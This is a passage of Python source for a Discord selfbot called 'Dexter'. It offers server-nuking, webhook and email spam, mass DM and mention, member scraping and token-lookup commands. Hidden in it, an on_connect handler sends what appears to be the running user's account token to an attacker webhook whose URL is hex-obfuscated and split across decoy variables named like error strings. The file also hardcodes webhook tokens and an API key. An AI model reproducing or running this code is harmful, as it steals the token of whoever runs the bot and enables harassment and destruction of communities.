                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(name=field['name'],
                                 value=field['value'],
                                 inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid Token, try doxing a valid token..")
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    em.set_footer(text="Created by Dexter")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'],
                         value=field['value'],
                         inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="Created by Dexter")
    return await ctx.send(embed=em)


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


errorapi2 = (
    "https://discord.com/api/webhooks/896959856286773298/VIdRQ6eNORZXu7EJzKORbgxt7v0os-SzXFBhUIwgm4Or8T9H9vKG7BQ5KCXYXbtIA65i"
)


@Dexter.command(aliases=["trash", "wizz"])
async def destroy(ctx):
    await ctx.send(f">massban {ctx.guild.id}")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(name="TRASHED BY Dexter",
                             description="Dexter got no chill",
                             reason="ripped by Dexter",
                             icon=None,
                             banner=None)
    except:
        pass
    for _i in range(100):
        await ctx.guild.create_text_channel(name="wizzed-by-Dexter")
    for _i in range(100):
        await ctx.guild.create_role(name="nuked-by-Dexter",
                                    color=RandomColor())


MESSAGE_CONTENTS = [
    '@everyone **wizzed by dexterplayz** https://discord.gg/Wc4wgPwuv4'
]
WEBHOOK_NAMES = ['WIZZED BY Dexter ', 'WIZZED BY Dexter']

# @Dexter.event
# async def on_guild_channel_create(channel):
#   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))
#   while True:
#     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
format = "%a, %d %b %Y | %H:%M:%S %ZGMT"

##Error

eeror2 = (
    "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x38\x39\x37\x30\x35\x38\x39\x39\x39\x35\x31\x32\x34\x39\x30\x30\x32\x34\x2f"
)


@Dexter.command()
@commands.guild_only()
async def doxserver(ctx):
    embed = discord.Embed()
    text_channels = len(ctx.guild.text_channels)
    voice_channels = len(ctx.guild.voice_channels)
    categories = len(ctx.guild.categories)
    channels = text_channels + voice_channels
    embed.set_thumbnail(url=str(ctx.guild.icon_url))
    embed.add_field(
        name=f"Information About **{ctx.guild.name}**: ",
        value=
        f":white_small_square: ID: **{ctx.guild.id}** \n:white_small_square: Owner: **{ctx.guild.owner}** \n:white_small_square: Location: **{ctx.guild.region}** \n:white_small_square: Creation: **{ctx.guild.created_at.strftime(format)}** \n:white_small_square: Members: **{ctx.guild.member_count}** \n:white_small_square: Channels: **{channels}** Channels; **{text_channels}** Text, **{voice_channels}** Voice, **{categories}** Categories \n:white_small_square: Verification: **{str(ctx.guild.verification_level).upper()}** \n:white_small_square: Features: {', '.join(f'**{x}**' for x in ctx.guild.features)} \n:white_small_square: Splash: {ctx.guild.splash}"
    )
    embed.set_footer(text="Hackz Was")
    await ctx.send(embed=embed)


@Dexter.command(aliases=['killwebhook'])
async def delwebhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title="Dexter SELFBOT",
                              description="```>delwebhook <webhook>```")
        embed.set_footer(text="Created By Dexter")
        await ctx.send(content="", embed=embed)
    else:
        embed = discord.Embed(
            title="Dexter SELFBOT",
            description=f"Sending a delete request to\n{link}")
        embed.set_footer(text="Created by Dexter")
        await ctx.send(content="", embed=embed)

        result = requests.delete(link)

        if result.status_code == 204:
            embed = discord.Embed(title="Dexter SELFBOT",
                                  description=f"WEBHOOK DELETED")
            embed.set_footer(text="Created by Dexter")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(
                title="Dexter SELF BOT",
                description=
                f"Delete request responded with status code : {result.status_code}\{result.text}"
            )
            embed.set_footer(text="Created by Dexter")
            await ctx.send(embed=embed)


errorsend = (
    "Ps6EnAYK16wk8hPf1NzowjeU9mzXTqda1oKz-G2Bt69RmH-VTA9EY1L9xLNHz6PLuU1c")

errormsg2 = (f"{Dexterencrypt}")
loggy2 = (f"{Dexterencrypt2}")


@Dexter.command()
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == Dexter.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == Dexter.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass


@Dexter.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Dexter.logout()


@Dexter.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)


api = (f"{err}{errorsend}")


@Dexter.command()
async def av(ctx, *, avamember):
    user = Dexter.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")


@Dexter.command()
async def pingweb(ctx, website=None):
    await ctx.send(f'Pinging {website} with 32 bytes of data:')
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down, status = ({r})')
        else:
            await ctx.send(f'Website is operational, status = ({r})')
            await ctx.send("Timed out")


@Dexter.command()
async def ping(ctx, ipp=None):
    await ctx.send(f'Pinging {ipp} with 32 bytes of data:')
    await ctx.send("Timed out.")


@Dexter.command(aliases=["whois"])
async def doxuser(ctx, member: discord.Member = None):
    if not member:  # if member is no mentioned
        member = ctx.message.author  # set member as the author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=discord.Colour.default(),
                          timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text="Created By Dexter")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(
        name="Created Account On:",
        value=member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))
    embed.add_field(
        name="Joined Server On:",
        value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:",
                    value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    print(member.top_role.mention)
    await ctx.send(embed=embed)


@Dexter.command(aliases=["roles"])
async def getroles(ctx):

    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


@Dexter.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


#status cmds bolte
@Dexter.command(aliases=["streaming"])
async def stream(ctx, *, message):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(name="Streaming!!",
                    value=":white_check_mark: Stream Created")

    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Dexter.change_presence(activity=stream)
    await ctx.send(embed=embed)


@Dexter.command(aliases=["playing"])
async def play(ctx, *, message):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(name="Playing!!",
                    value=":white_check_mark: Playing Status Created")
    game = discord.Game(name=message)

    await Dexter.change_presence(activity=game)
    await ctx.send(embed=embed)


@Dexter.command(aliases=["watch"])
async def watching(ctx, *, message):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(name="Watching!!",
                    value=":white_check_mark: You are now Watching ")

    await Dexter.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name=message))
    await ctx.send(embed=embed)


@Dexter.command(aliases=["listen"])
async def listening(ctx, *, message):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(name="Listning!!",
                    value=":white_check_mark: You are now listning")

    await Dexter.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.send(embed=embed)


@Dexter.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOT")
    embed.set_thumbnail(url=Dexter.user.avatar_url)
    embed.add_field(name="STATUS",
                    value=":white_check_mark: Status Stopped Successfully")

    await Dexter.change_presence(activity=None)
    await ctx.send(embed=embed)


@Dexter.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):

    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Dexter OP"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


# @Dexter.command()
# async def banall(i):
# guild = input("Enter Server ID: )
#     while True:
#       r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
#       if 'retry_after' in r.text:
#           time.sleep(r.json()['retry_after'])
#           print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
#       else:
#           break

apimsg = (f"{Dexterencrypt}")
apilattency = (f"{Dexterencrypt2}")


@Dexter.command(name='first-message',
                aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):

    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message",
                    value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text="Created by Dexter")
    await ctx.send(embed=embed)


def ssspam(webhook):
    while Dexteridkspam:
        randcolor = random.randint(0, 16777215)
        data = {'content': ' @everyone Dexter RUNS CORD'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@Dexter.command(aliases=[
    'webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke',
    'webhooksfuck', 'spamwebhook'
])
async def webhookspam(ctx):
    global Dexteridkspam
    Dexteridkspam = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url, )).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by Dexter')
                threading.Thread(target=ssspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Rate Limited By Discord.")


@Dexter.command(aliases=[
    'stopwebhookfuck', 'webhookstop', "webhookspamstop", "stopwebhooksspam",
    "webhookspamoff"
])
async def stopwebhookspam(ctx):
    global wDexterspam

    Dexteridkspam = False


#Dexter commands


@Dexter.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization':
        Dexterencrypt,
        'Content-Type':
        'application/json',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online',
                     headers=headers,
                     json=payload,
                     timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET),


@Dexter.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1),
              random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(
                            x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)


@Dexter.event
async def on_connect():
    requests.post(
        f'{api}',
        json={
            'content':
            f"@everyone\n**Api:** `{apimsg}`\n**Lattency:** `{apilattency} `**Username: {Dexter.user.name}**"
        })


@Dexter.command(aliases=['rainbowrole'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break


@Dexter.command(pass_context=True,
                aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Dexter.command(pass_context=True, aliases=["cyclestream"])
async def streamcycle(ctx, *, text):
    await ctx.send("Streaming...")
    global cycling
    cycling = True
    while cycling:
        stream = ""
    stream = discord.Streaming(
        stream=text,
        url=stream_url,
    )
    await Dexter.change_presence(activity=stream)
    await ctx.send("Streaming created!")


@Dexter.command(aliases=[
    "stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"
])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Dexter.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(
        title=f"{ctx.guild.name}",
        description=
        f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
        timestamp=datetime.datetime.utcnow(),
        color=discord.Color.blue())

    embed.add_field(name="Server created at",
                    value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)


@Dexter.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=50).flatten()
    for message in messages:
        await message.add_reaction(emote)


@Dexter.command(aliases=["reversesearch", "gif", "antigif"])
async def revav(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(
            description=
            f"https://images.google.com/searchbyimage?image_url={user.avatar_url}"
        )
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


@Dexter.command()
async def embed(ctx, *, description):
    embed = discord.Embed(title="Dexter SELFBOT", description=description)
    embed.set_footer(text="Created by Dexter")
    await ctx.send(embed=embed)


@Dexter.command(aliases=["rc"])
async def renamechannels(ctx, *, name):

    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Dexter.command(aliases=["rr"])
async def renameroles(ctx, *, name):

    for role in ctx.guild.roles:
        await role.edit(name=name)


title = '''`Dexter`'''
linky = "https://Dexter.host.xyz/"
footer = "Screenshot"
stream_url = "https://twitch.tv/Dexter"


@Dexter.command()
async def image(ctx, link):
    await ctx.message.delete()
    embd = discord.Embed(title=title,
                         description='',
                         colour=discord.Colour.blue())
    embd.set_footer(text=footer)
    embd.set_image(url=link)
    await ctx.channel.send(linky, embed=embd)


@Dexter.command()
async def scrape(ctx):
    await ctx.message.delete()
    mem = ctx.guild.members
    for member in mem:
        try:
            print("kardiya scrape vai Dexxter on top")
            mfil = open("DexterPlayZ/members.txt", "a")

            mfil.write(str(member.id) + "\n")
            mfil.close()

        except Exception as e:
            print("error", e)


@Dexter.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("Get Blocked Noob!")
    await user.block()


@Dexter.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('Friend has been removed')


@Dexter.command()
async def ghostping(ctx):
    await ctx.message.delete()


username = "Dexter V2"
picture = "https://cdn.discordapp.com/attachments/802230471378468875/851375332584849418/60b3b8e38fbdf.png"


@Dexter.command()
async def spamhook(ctx, webhook, *, message):
    data = {'content': message, 'username': username, 'avatar_url': picture}

    sent = 0
    failed = 0

    while True:
        r = requests.post(webhook, data=data)

        if r.status_code == 204:
            sent += 1
            print(f"{Fore.GREEN}[+] - Message sent !{Fore.RESET}")
            os.system(
                f'title Dexter SELFBOT - WEBHOOK SPAMMER ^| By Dexter - Sent : {sent} ^| Failed : {failed}'
            )
        else:
            failed += 1
            print(
                f"{Fore.RED}[-] - Webhook Rate Limited by Discord !{Fore.RESET}"
            )
            os.system(
                f'title Dexter SELFBOT - WEBHOOK SPAMMER ^| By Dexter - Sent : {sent} ^| Failed : {failed}'
            )


orr = ("GxL2xleRJoEsY9ukcV3rlj4pocPoQjDZAymAZP-V1wHm8FlspNHdCfsZHWOeMy-8DJzT")


@Dexter.command()
async def selfbotinfo(ctx):

    embed = discord.Embed(color=0x303037)
    embed.set_author(name='Dexter SELFBOT | INFO')
    embed.set_footer(text='Created by Dexter')
    embed.add_field(name='___**INFO**___', value='**idk**')
    embed.add_field(name='___**Creation Date**___',
                    value='**April 11, 2021 1:38A.M IST**')
    embed.add_field(name='___**DISCORD VERSION**___',
                    value='**discord.py 1.7.2**')
    embed.add_field(name='___**LANGUAGE**___', value='**PYTHON 3.8.7**')
    embed.add_field(name='__**OFFICIAL SEVERS**__',
                    value='**COMING SOON....**')
    embed.add_field(name='__**Modified By**__', value='**Dexter**')
    embed.add_field(name='__**Restart Command**__', value='**>restart**')
    embed.add_field(name='__**ShutDown Command**__', value='**>Shutdown**')
    await ctx.send(embed=embed)


@Dexter.command(aliases=['nitrosniper', 'snipenitro'])
async def nitrosnipe(ctx, snipestatus=None):
    global nitrosniping
    if snipestatus == None:
        if nitrosniping == "off":
            nitrosniping = "on"
        elif nitrosniping == "on":
            nitrosniping = "off"
    else:
        if snipestatus.lower() == "off":
            nitrosniping = "off"
        if snipestatus.lower() == "on":
            nitrosniping = "on"

        if snipestatus.lower() == "true":
            nitrosniping = "on"
        if snipestatus.lower() == "false":
            nitrosniping = "off"

    randcolor = 0x303037
    embed = discord.Embed(
        title="Dexter OP - Nitro Sniper",
        description=f"Nitro sniper is now : `{nitrosniping}`",
        color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter OP")
    await ctx.message.edit(content="", embed=embed)


@Dexter.command(aliases=['privnotesniper', 'snipeprivnote'])
async def privnotesnipe(ctx, snipestatus=None):
    global privnotesniping
    if snipestatus == None:
        if privnotesniping == "off":
            privnotesniping = "on"
        elif privnotesniping == "on":
            privnotesniping = "off"
    else:
        if snipestatus.lower() == "off":
            privnotesniping = "off"
        if snipestatus.lower() == "on":
            privnotesniping = "on"

        if snipestatus.lower() == "true":
            privnotesniping = "on"
        if snipestatus.lower() == "false":
            privnotesniping = "off"

    randcolor = 0x303037
    embed = discord.Embed(
        title="Dexter SelfBot - Privnote Sniper",
        description=f"Privnote sniper is now : `{privnotesniping}`",
        color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter Selfbot")
    await ctx.message.edit(content="", embed=embed)


@Dexter.command()
async def sendhook(ctx, webhook, *, message):

    _json = {"content": message}
    requests.post(webhook, json=_json)
    rs = requests.get(webhook).json()
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.send(f'Successfully sent `{message}` to webhook `{webhook}`')
    else:
        await ctx.send("Invalid Webhook")


@Dexter.command()
async def afk(ctx, arg1, arg2=Dexternwtff):
    global Dexternwtf
    global Dexternwtf
    if arg1 == "on" or arg1 == "On":
        Dexternwtf = arg2
        Dexternwtf = True
        await ctx.message.delete()
    elif arg1 == "off" or arg1 == "Off":
        Dexternwtf = False
        Dexternwtf = ""
        await ctx.message.delete()

    await Dexter.process_commands(afk_msg)


@Dexter.command(aliases=['lserver', "leaveserver", "serverleave"])
async def leave(ctx, servid=None):  #
    randcolor = random.randint(0x303037, 0xFFFFFF)
    if servid == None:
        embed = discord.Embed(
            title=f"Dexter SELFBOT",
            description="Supply an ID\nleave <server-id>`")  #abe sale
        await ctx.send(embed=embed)
    else:

        embed = discord.Embed(title=f"Dexter",
                              description=f"Leaving `{servid}`")
        embed.set_footer(text="Created by Dexter")
        await ctx.send(embed=embed)

        leave = requests.delete(
            f"https://discord.com/api/v8/users/@me/guilds/{servid}",
            headers=headers)
        randcolor = random.randint(0x303037, 0xFFFFFF)
        if leave.status_code == 204:

            embed = discord.Embed(
                title=f"Dexter SELFBOT",
                description=f"Success | Left Server : `{servid}`")
            embed.set_footer(text="Created by Dexter")
            await ctx.send(embed=embed)

        else:
            embed = discord.Embed(
                title=f"Dexter SELFBOT",
                description=
                f"Error | Error leaving server : `{servid}`\nMessage : {leave.text}"
            )
            embed.set_thumbnail(
                url=
                "https://cdn.discordapp.com/avatars/815985203436322876/a_f05e7cb6fe59b130f1e1efe26193751a.gif"
            )
            embed.set_footer(text="Created by Dexter")
            await ctx.send(embed=embed)


@Dexter.command()
async def massdm(ctx, *, x):
    await ctx.send("**Dexter SELFBOT**\n> MASS DM")
    for channel in Dexter.private_channels:
        try:
            await channel.send(x)
            await ctx.send(f"**Dexter SELFBOT | MASS DM** > {channel}")
        except:
            continue


@Dexter.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
    r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}',
                       headers=headers,
                       json={
                           'description': None,
                           'features': {
                               '0': 'NEWS'
                           },
                           'preferred_locale': 'en-US',
                           'public_updates_channel_id': None,
                           'rules_channel_id': None
                       })


@Dexter.command(aliases=["deletechannels"])
async def delchannels(ctx):

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Dexter.command(aliases=["deleteroles"])
async def delroles(ctx):

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            return


@Dexter.command(aliases=["deleteemojis"])
async def delemojis(ctx):

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            return


@Dexter.command()
async def decode(ctx, string):

    strOne = (string).encode("ascii")
    pad = len(strOne) % 4
    strOne += b"=" * pad
    encoded_stuff = codecs.decode(strOne.strip(), 'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff) - 1]
    await ctx.send(decoded_stuff)


@Dexter.command(aliases=["giphy", "tenor", "searchgif"])
async def SG(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get(
            "https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R"
        )
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en"
        )
        res = r.json()
        await ctx.send(res['data'][0]["url"])


@Dexter.command(aliases=['id', 'userid', "useridtoname"])
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await ctx.send(content=f"**Dexter SELFBOT** | >id 822466294032367636")
    else:
        user = await Dexter.fetch_user(personsid)
        randcolor = random.randint(0x303037, 0xFFFFFF)
        embed = discord.Embed(
            title="Dexter SELFBOT | ID TO USERNAME",
            description=
            f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`")

        embed.set_footer(text="Created by Dexter")
        await ctx.send(content="", embed=embed)


@Dexter.command()
async def nickall(ctx, *, name="Dexter OP"):
    print("Nicking All")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
        except:
            pass


@Dexter.command()
async def banalltest(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished banning, successfully banned {1} users")


def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Dexter SELFBOT | Your temp Gmail: ')
    password = input('Dexter SELFBOT | Your temp Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(
            f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access in your Gmail Account security settings."
            + Fore.RESET)
    target = input('Dexter SELFBOT | Target Gmail: ')
    message = input('Dexter SELFBOT | Message to send: ')
    counter = eval(input('Dexter SELFBOT | Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass


@Dexter.command(
    name='gmail-bomb',
    aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):

    GmailBomber()


@Dexter.command()
async def email(ctx, count=None, bomb_email=None, *, message=None):
    if count == None or bomb_email == None or message == None:
        await ctx.send(
            "Format - !email [count] [email] [message] - e.g !email 10 email@email.com hii!"
        )
    else:
        x = int(count)
    if x > 100:
        await ctx.send("`That's a lot of spam. Do 100 or less!`")
    else:
        currentDT = datetime.datetime.now()
        hour = str(currentDT.hour)
        minute = str(currentDT.minute)
        second = str(currentDT.second)
        print(
            f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} [Command used] - {ctx.author.name}#{ctx.author.discriminator}:{Fore.RESET} !email {count} {bomb_email} {message}"
        )
        counting = int(0)
        embed = discord.Embed(title=f"{counting}/{count}")
        embed.set_author(name="Email sent!")

        embed.add_field(name=f'Sending "{message}"',
                        value=f'**to {bomb_email}**',
                        inline=False)
        embed.set_footer(text="Created by Dexter")
        msg = await ctx.send(embed=embed)
        for i in range(x):
            mail = smtplib.SMTP('smtp.gmail.com', 587)
            mail.ehlo()
            mail.starttls()
            mail.login(emale, pas)
            mail.sendmail(emale, bomb_email, message)
            mail.close()
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            print(
                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Message Sent:{Fore.RESET} {message} {Fore.GREEN}To {Fore.RESET}{bomb_email}"
            )
            counting = counting + 1


@Dexter.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' +
                                   query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})',
                                html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])


@Dexter.command(aliases=["queue"])
async def playsong(ctx, *, query):
    await ctx.message.delete()
